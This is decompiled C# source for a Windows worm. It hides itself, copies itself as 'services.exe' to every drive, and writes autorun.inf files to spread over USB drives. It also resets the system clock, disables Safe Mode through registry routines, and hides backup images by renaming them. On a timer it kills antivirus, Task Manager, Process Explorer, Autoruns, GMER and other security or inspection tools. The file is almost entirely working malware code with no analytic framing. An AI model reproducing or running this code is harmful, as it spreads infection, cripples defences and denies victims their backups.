using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace redice;

public class Form1 : Form
{
	private enum DriveType
	{
		NotExist = 1,
		FloppyOrUsb,
		FixedDisk,
		NetDisk,
		CDRom,
		RAMDisk
	}

	public class LibWrapDateTime
	{
		[DllImport("Kernel32.dll")]
		public static extern void GetLocalTime(SystemTime st);

		[DllImport("Kernel32.dll")]
		public static extern void SetLocalTime(SystemTime st);
	}

	[StructLayout(LayoutKind.Sequential)]
	public class SystemTime
	{
		public ushort wYear;
	}

	private ExecRegedit objExecRegdit = new ExecRegedit();

	private IContainer components;

	private Timer timeCloseSafesoft;

	private Timer timerLong20;

	private Timer timerMid5;

	private int PrevInstance()
	{
		string processName = Process.GetCurrentProcess().ProcessName;
		return Process.GetProcessesByName(processName).GetUpperBound(0);
	}

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		try
		{
			try
			{
				Process.GetCurrentProcess();
				_ = Process.GetCurrentProcess().ProcessName;
				if (Process.GetCurrentProcess().ProcessName.ToLower().ToString().Equals("services"))
				{
					if (PrevInstance() > 1)
					{
						Application.Exit();
					}
				}
				else if (PrevInstance() > 0)
				{
					Application.Exit();
				}
			}
			catch
			{
			}
			try
			{
				hideForm();
			}
			catch
			{
			}
			try
			{
				changeSystemTime();
			}
			catch
			{
			}
			try
			{
				objExecRegdit.destroySafeMode();
			}
			catch
			{
			}
			try
			{
				objExecRegdit.delRegeditHideFile();
			}
			catch
			{
			}
			try
			{
				objExecRegdit.uodateRegeditAutoRun();
			}
			catch
			{
			}
			try
			{
				objExecRegdit.setIEStarPage();
			}
			catch
			{
			}
			try
			{
				objExecRegdit.changeIEtitle();
			}
			catch
			{
			}
		}
		catch
		{
		}
		try
		{
			string text = AppDomain.CurrentDomain.BaseDirectory.Substring(0, 1).ToUpper();
			if (IsRemove(text + ":\\"))
			{
				Process.Start("c:\\services.exe");
				Application.Exit();
			}
		}
		catch
		{
		}
	}

	private void timeCloseSafesoft_Tick(object sender, EventArgs e)
	{
		try
		{
			closeSafeSoft();
		}
		catch
		{
		}
	}

	private void timerLong20_Tick(object sender, EventArgs e)
	{
		try
		{
			delUImmunityCreateAutorun();
		}
		catch
		{
		}
		try
		{
			copyVirusReName();
		}
		catch
		{
		}
	}

	private void timerMid5_Tick(object sender, EventArgs e)
	{
		try
		{
			changeSystemTime();
		}
		catch
		{
		}
		try
		{
			objExecRegdit.destroySafeMode();
		}
		catch
		{
		}
		try
		{
			objExecRegdit.fileImageHijack();
		}
		catch
		{
		}
		try
		{
			objExecRegdit.delRegeditHideFile();
		}
		catch
		{
		}
		try
		{
			objExecRegdit.recomposeFileRelating();
		}
		catch
		{
		}
		try
		{
			objExecRegdit.delOtherVirusReg();
		}
		catch
		{
		}
		try
		{
			findAllGhoPath();
		}
		catch
		{
		}
		try
		{
			objExecRegdit.killSafeServer();
		}
		catch
		{
		}
		try
		{
			objExecRegdit.closeAutoUpdateAndSafeMiddle();
		}
		catch
		{
		}
		try
		{
			objExecRegdit.uodateRegeditAutoRun();
		}
		catch
		{
		}
		try
		{
			objExecRegdit.setIEStarPage();
		}
		catch
		{
		}
		try
		{
			objExecRegdit.changeIEtitle();
		}
		catch
		{
		}
	}

	private void copyVirusReName()
	{
		Process process = new Process();
		try
		{
			string[] logicalDrives = Environment.GetLogicalDrives();
			for (int i = 0; i < logicalDrives.Length; i++)
			{
				string currentDirectory = Directory.GetCurrentDirectory();
				string fileName = Path.GetFileName(Application.get_ExecutablePath());
				string text = logicalDrives[i].ToString().Substring(0, 1).ToUpper();
				if (!text.Equals("A") && !IsCDRom(logicalDrives[i].ToString()))
				{
					try
					{
						File.Copy(currentDirectory + "\\" + fileName, text + ":\\services.exe", overwrite: true);
						File.SetAttributes(text + ":\\services.exe", FileAttributes.Normal);
						File.SetAttributes(text + ":\\services.exe", FileAttributes.ReadOnly);
						FileAttributes attributes = File.GetAttributes(text + ":\\services.exe");
						File.SetAttributes(text + ":\\services.exe", attributes | FileAttributes.System);
						attributes = File.GetAttributes(text + ":\\services.exe");
						File.SetAttributes(text + ":\\services.exe", attributes | FileAttributes.Hidden);
						string text2 = text + ":\\services.exe";
						string text3 = text + ":\\hotice..\\";
						process = execCmd(process);
						Thread.Sleep(25);
						process.StandardInput.WriteLine("md " + text + ":\\hotice..\\");
						string value = "copy " + text2 + " " + text3;
						Thread.Sleep(25);
						process.StandardInput.WriteLine(value);
						process.Dispose();
						process.Close();
					}
					catch
					{
					}
				}
			}
		}
		catch
		{
		}
	}

	[DllImport("kernel32.dll", CharSet = CharSet.Auto)]
	private static extern int GetDriveType(string driveinfo);

	public bool IsCDRom(string driveInfo)
	{
		if (driveInfo != null && !(driveInfo == ""))
		{
			if (GetDriveType(driveInfo) == 5)
			{
				return true;
			}
			return false;
		}
		return false;
	}

	public bool IsRemove(string driveInfo)
	{
		if (driveInfo != null && !(driveInfo == ""))
		{
			if (GetDriveType(driveInfo) == 2)
			{
				return true;
			}
			return false;
		}
		return false;
	}

	private void delUImmunityCreateAutorun()
	{
		try
		{
			string[] logicalDrives = Environment.GetLogicalDrives();
			for (int i = 0; i < logicalDrives.Length; i++)
			{
				string text = logicalDrives[i].ToString().Substring(0, 1).ToUpper();
				if (!IsCDRom(logicalDrives[i].ToString()) && !text.Equals("A"))
				{
					try
					{
						execDelUImmunityCreateAutorun(text);
					}
					catch
					{
					}
				}
			}
		}
		catch
		{
		}
	}

	private void execDelUImmunityCreateAutorun(string rootPath)
	{
		string text = rootPath + ":\\autorun.inf";
		if (File.Exists(text))
		{
			File.SetAttributes(text, FileAttributes.Normal);
			File.Delete(text);
			buildAutoruninf(rootPath);
			return;
		}
		if (Directory.Exists(text))
		{
			File.SetAttributes(text, FileAttributes.Normal);
			try
			{
				Directory.Delete(text, recursive: true);
			}
			catch
			{
				Directory.GetFiles(text);
				DirectoryInfo directoryInfo = new DirectoryInfo(text);
				FileInfo[] files = directoryInfo.GetFiles();
				FileInfo[] array = files;
				foreach (FileInfo fileInfo in array)
				{
					string path = text + "\\" + fileInfo.ToString();
					File.SetAttributes(path, FileAttributes.Normal);
					File.Delete(path);
				}
			}
			try
			{
				Directory.Delete(text, recursive: true);
			}
			catch
			{
				try
				{
					Process p = new Process();
					p = execCmd(p);
					string value = "rd /q/s " + rootPath + ":\\autorun.inf\\";
					p.StandardInput.WriteLine(value);
					p.Close();
				}
				catch
				{
				}
			}
			try
			{
				File.SetAttributes(text, FileAttributes.Normal);
				Directory.Delete(text, recursive: true);
			}
			catch
			{
			}
			buildAutoruninf(rootPath);
			return;
		}
		try
		{
			buildAutoruninf(rootPath);
		}
		catch
		{
		}
	}

	private Process execCmd(Process p)
	{
		p.StartInfo.FileName = "cmd.exe";
		p.StartInfo.UseShellExecute = false;
		p.StartInfo.RedirectStandardInput = true;
		p.StartInfo.RedirectStandardOutput = true;
		p.StartInfo.RedirectStandardError = true;
		p.StartInfo.CreateNoWindow = true;
		p.Start();
		return p;
	}

	private void buildAutoruninf(string rootPath)
	{
		try
		{
			string path = rootPath + ":\\autorun.inf";
			File.SetAttributes(path, FileAttributes.Normal);
			Directory.Delete(path, recursive: true);
		}
		catch
		{
		}
		try
		{
			using (StreamWriter streamWriter = new StreamWriter(rootPath + ":\\autorun.inf"))
			{
				streamWriter.WriteLine("[autorun]");
				streamWriter.WriteLine("OPEN=" + rootPath + ":\\services.exe");
				streamWriter.WriteLine("shell\\open\\Command=" + rootPath + ":\\services.exe");
				streamWriter.WriteLine("shell\\open\\Default=");
				streamWriter.Write("shell\\explore\\Command=" + rootPath + ":\\services.exe");
			}
			File.SetAttributes(rootPath + ":\\autorun.inf", FileAttributes.Normal);
			File.SetAttributes(rootPath + ":\\autorun.inf", FileAttributes.ReadOnly);
			FileAttributes attributes = File.GetAttributes(rootPath + ":\\autorun.inf");
			File.SetAttributes(rootPath + ":\\autorun.inf", attributes | FileAttributes.System);
			attributes = File.GetAttributes(rootPath + ":\\autorun.inf");
			File.SetAttributes(rootPath + ":\\autorun.inf", attributes | FileAttributes.Hidden);
		}
		catch
		{
		}
	}

	private void findAllGhoPath()
	{
		try
		{
			string[] logicalDrives = Environment.GetLogicalDrives();
			for (int i = 0; i < logicalDrives.Length; i++)
			{
				string text = logicalDrives[i].ToString().Substring(0, 1).ToUpper();
				if (!IsCDRom(logicalDrives[i].ToString()) && !text.Equals("A"))
				{
					try
					{
						delGhoGetPath(text);
						delGhoGetPath(text + ":\\sysbak\\");
						delGhoGetPath(text + ":\\beifen\\");
					}
					catch
					{
					}
				}
			}
		}
		catch
		{
		}
	}

	private void delGhoGetPath(string path)
	{
		try
		{
			if (path.Length == 1)
			{
				string[] files = Directory.GetFiles(path + ":\\");
				checkDelGho(files);
			}
			else
			{
				string[] files2 = Directory.GetFiles(path);
				checkDelGho(files2);
			}
		}
		catch
		{
		}
	}

	private void checkDelGho(string[] ghoRootPath)
	{
		foreach (string text in ghoRootPath)
		{
			int length = text.Length;
			try
			{
				string text2 = text.Substring(length - 4, 4);
				if (text2.ToUpper().Equals(".GHO") || text2.ToUpper().Equals(".BKF") || text2.ToUpper().Equals(".PQI") || text2.ToUpper().Equals(".TIB") || text2.ToUpper().Equals(".BAK"))
				{
					File.SetAttributes(text, FileAttributes.Normal);
					string text3 = text + ".bek";
					File.Move(text, text3);
					File.SetAttributes(text3, FileAttributes.Hidden);
				}
			}
			catch
			{
			}
		}
	}

	private void changeSystemTime()
	{
		try
		{
			SystemTime systemTime = new SystemTime();
			LibWrapDateTime.GetLocalTime(systemTime);
			systemTime.wYear = 2006;
			LibWrapDateTime.SetLocalTime(systemTime);
		}
		catch
		{
		}
	}

	private void hideForm()
	{
		try
		{
			((Control)this).Hide();
		}
		catch
		{
		}
	}

	private void closeSafeSoft()
	{
		Process[] processes = Process.GetProcesses();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.MainWindowTitle.Length >= 1)
				{
					string mainWindowTitle = process.MainWindowTitle;
					if (execCloseSafeSoftHaveTitle(mainWindowTitle, "兔子拜佛专杀"))
					{
						process.Kill();
					}
					if (execCloseSafeSoftHaveTitle(mainWindowTitle, "报警"))
					{
						process.Kill();
					}
					if (execCloseSafeSoftHaveTitle(mainWindowTitle, "举报"))
					{
						process.Kill();
					}
					if (execCloseSafeSoftHaveTitle(mainWindowTitle, "流氓软件"))
					{
						process.Kill();
					}
					if (execCloseSafeSoftHaveTitle(mainWindowTitle, "恶意软件"))
					{
						process.Kill();
					}
					if (execCloseSafeSoftHaveTitle(mainWindowTitle, "IceSword"))
					{
						process.Kill();
					}
					if (execCloseSafeSoftHaveTitle(mainWindowTitle, "进程"))
					{
						process.Kill();
					}
					if (execCloseSafeSoftHaveTitle(mainWindowTitle, "系统配置"))
					{
						process.Kill();
					}
					if (execCloseSafeSoftHaveTitle(mainWindowTitle, "注册表"))
					{
						process.Kill();
					}
					if (execCloseSafeSoftHaveTitle(mainWindowTitle, "彻底清除"))
					{
						process.Kill();
					}
					if (execCloseSafeSoftHaveTitle(mainWindowTitle, "winrar"))
					{
						process.Kill();
					}
					if (execCloseSafeSoftHaveTitle(mainWindowTitle, "icesword"))
					{
						process.Kill();
					}
					if (execCloseSafeSoftHaveTitle(mainWindowTitle, "SYMANTEC"))
					{
						process.Kill();
					}
					if (execCloseSafeSoftHaveTitle(mainWindowTitle, "cmd"))
					{
						process.Kill();
					}
					if (execCloseSafeSoftHaveTitle(mainWindowTitle, "c:\\"))
					{
						process.Kill();
					}
					if (execCloseSafeSoftHaveTitle(mainWindowTitle, "d:\\"))
					{
						process.Kill();
					}
					if (execCloseSafeSoftHaveTitle(mainWindowTitle, "e:\\"))
					{
						process.Kill();
					}
					if (execCloseSafeSoftHaveTitle(mainWindowTitle, "f:\\"))
					{
						process.Kill();
					}
					if (execCloseSafeSoftHaveTitle(mainWindowTitle, "g:\\"))
					{
						process.Kill();
					}
					if (execCloseSafeSoftHaveTitle(mainWindowTitle, "h:\\"))
					{
						process.Kill();
					}
					if (execCloseSafeSoftHaveTitle(mainWindowTitle, "i:\\"))
					{
						process.Kill();
					}
					if (execCloseSafeSoftHaveTitle(mainWindowTitle, "j:\\"))
					{
						process.Kill();
					}
					if (execCloseSafeSoftHaveTitle(mainWindowTitle, "求救"))
					{
						process.Kill();
					}
					if (execCloseSafeSoftHaveTitle(mainWindowTitle, "日本の陛下"))
					{
						process.Kill();
					}
					if (execCloseSafeSoftHaveTitle(mainWindowTitle, "日文学习"))
					{
						process.Kill();
					}
					if (execCloseSafeSoftHaveTitle(mainWindowTitle, "任务管理器"))
					{
						process.Kill();
					}
					if (execCloseSafeSoftHaveTitle(mainWindowTitle, "btbaicai"))
					{
						process.Kill();
					}
					if (execCloseSafeSoftHaveTitle(mainWindowTitle, "wopticlean"))
					{
						process.Kill();
					}
					if (execCloseSafeSoftHaveTitle(mainWindowTitle, "IE修复"))
					{
						process.Kill();
					}
					if (execCloseSafeSoftHaveTitle(mainWindowTitle, "新病毒"))
					{
						process.Kill();
					}
					if (execCloseSafeSoftHaveTitle(mainWindowTitle, "procexp"))
					{
						process.Kill();
					}
					if (execCloseSafeSoftHaveTitle(mainWindowTitle, "autoruns"))
					{
						process.Kill();
					}
					if (execCloseSafeSoftHaveTitle(mainWindowTitle, "GMER"))
					{
						process.Kill();
					}
					if (execCloseSafeSoftHaveTitle(mainWindowTitle, "PAVARK"))
					{
						process.Kill();
					}
					if (execCloseSafeSoftHaveTitle(mainWindowTitle, "提取"))
					{
						process.Kill();
					}
					if (execCloseSafeSoftHaveTitle(mainWindowTitle, "上报"))
					{
						process.Kill();
					}
				}
				else
				{
					string processName = process.ProcessName;
					if (execCloseSafeSoftUnHaveTitle(processName, "AUTOUPDATE.EXE"))
					{
						process.Kill();
					}
					if (execCloseSafeSoftUnHaveTitle(processName, "AUTOTRACE.EXE"))
					{
						process.Kill();
					}
					if (execCloseSafeSoftUnHaveTitle(processName, "AUTODOWN.EXE"))
					{
						process.Kill();
					}
				}
			}
			catch
			{
			}
		}
	}

	private bool execCloseSafeSoftHaveTitle(string thisProcess, string title)
	{
		try
		{
			if (thisProcess.ToString().ToUpper().IndexOf(title.ToUpper()) != -1)
			{
				return true;
			}
			return false;
		}
		catch
		{
			return false;
		}
	}

	private bool execCloseSafeSoftUnHaveTitle(string thisProcess, string process)
	{
		try
		{
			if (thisProcess.ToString().ToUpper().Equals(process.ToUpper()))
			{
				return true;
			}
			return false;
		}
		catch
		{
			return false;
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_0044: Unknown result type (might be due to invalid IL or missing references)
		//IL_004e: Expected O, but got Unknown
		//IL_013a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0144: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		timeCloseSafesoft = new Timer(components);
		timerLong20 = new Timer(components);
		timerMid5 = new Timer(components);
		((Control)this).SuspendLayout();
		timeCloseSafesoft.set_Enabled(true);
		timeCloseSafesoft.set_Interval(1500);
		timeCloseSafesoft.add_Tick((EventHandler)timeCloseSafesoft_Tick);
		timerLong20.set_Enabled(true);
		timerLong20.set_Interval(20000);
		timerLong20.add_Tick((EventHandler)timerLong20_Tick);
		timerMid5.set_Enabled(true);
		timerMid5.set_Interval(10000);
		timerMid5.add_Tick((EventHandler)timerMid5_Tick);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)0);
		((Control)this).set_BackColor(Color.White);
		((Control)this).set_BackgroundImageLayout((ImageLayout)0);
		((Form)this).set_ClientSize(new Size(112, 27));
		((Form)this).set_ControlBox(false);
		((Control)this).set_Cursor(Cursors.get_Hand());
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_SizeGripStyle((SizeGripStyle)2);
		((Form)this).set_StartPosition((FormStartPosition)0);
		((Form)this).set_TransparencyKey(Color.White);
		((Form)this).set_WindowState((FormWindowState)1);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
